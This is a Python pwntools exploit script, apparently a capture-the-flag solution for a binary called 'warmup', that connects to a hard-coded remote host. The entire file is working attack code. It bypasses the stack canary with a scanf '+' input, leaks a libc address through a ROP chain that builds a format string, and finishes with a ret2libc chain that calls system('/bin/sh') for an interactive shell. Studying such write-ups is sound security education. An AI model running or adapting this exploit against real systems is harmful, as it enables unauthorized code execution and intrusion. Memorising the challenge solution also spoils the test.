#!/usr/bin/env python3

from pwn import *

exe = ELF("./warmup")
libc = ELF("./libc.so.6")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("45.122.249.68", 20001)
    return r

p = conn()

############################
### Stage 1: Leak canary ###
############################
ret = 0x0000000000401362
payload = [
    ret,                            # Saved rip
    exe.sym['main']
]

p.sendlineafter(b'Enter n: ', f'{19 + len(payload)}'.encode())
for i in range(17):
    p.sendlineafter(b': ', b'0')
p.sendlineafter(b': ', b'+')        # canary
p.sendlineafter(b': ', b'0')        # Saved rbp
for i in range(len(payload)):       # Saved rip
    p.sendlineafter(b': ', f'{payload[i]}'.encode())
canary = int(p.recvline()[:-1]) - ret - exe.sym['main']
log.info("Canary: " + hex(canary))

##########################################################
### Stage 2: Create format string && leak libc address ###
##########################################################
pop_rdi = 0x00000000004013d3
pop_rsi_r15 = 0x00000000004013d1
str_lu = 0x402021
payload = [
    pop_rdi, str_lu,
    pop_rsi_r15, 0x00000000404a00, 0,
    exe.sym['__isoc99_scanf'],

    pop_rdi, 0x00000000404a00,
    pop_rsi_r15, exe.got['printf'], 0,
    exe.sym['printf'],

    ret,
    exe.sym['main']
]

p.sendlineafter(b'Enter n: ', f'{19 + len(payload)}'.encode())
for i in range(17):
    p.sendlineafter(b': ', b'0')
p.sendlineafter(b': ', b'+')         # canary
p.sendlineafter(b': ', b'0')         # Saved rbp
for i in range(len(payload)):        # Saved rip
    p.sendlineafter(b': ', f'{payload[i]}'.encode())

p.recvline()
p.sendline(str(u16(b'%s')).encode())
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - libc.sym['printf']
log.info("Libc base: " + hex(libc.address))

##########################
### Stage 3: Get shell ###
##########################
payload = [
    ret,
    pop_rdi, next(libc.search(b'/bin/sh')),
    libc.sym['system'],
]

p.sendlineafter(b'Enter n: ', f'{19 + len(payload)}'.encode())
for i in range(17):
    p.sendlineafter(b': ', b'0')
p.sendlineafter(b': ', b'+')        # canary
p.sendlineafter(b': ', b'0')        # Saved rbp
for i in range(len(payload)):       # Saved rip
    p.sendlineafter(b': ', f'{payload[i]}'.encode())

p.interactive()